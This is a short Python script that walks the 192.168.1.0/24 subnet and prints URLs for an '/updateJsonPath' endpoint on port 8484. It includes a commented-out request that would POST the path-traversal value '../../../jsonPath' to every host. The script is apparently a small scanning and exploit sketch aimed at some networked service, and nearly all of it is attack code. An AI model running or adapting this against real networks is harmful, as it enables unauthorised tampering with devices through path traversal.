import requests

for x in range(2,254):
	print ('http://192.168.1.' + str(x) + ':8484/updateJsonPath')
	#response = requests.post('http://192.168.1.' + str(x) + ':8484/updateJsonPath', data='../../../jsonPath')
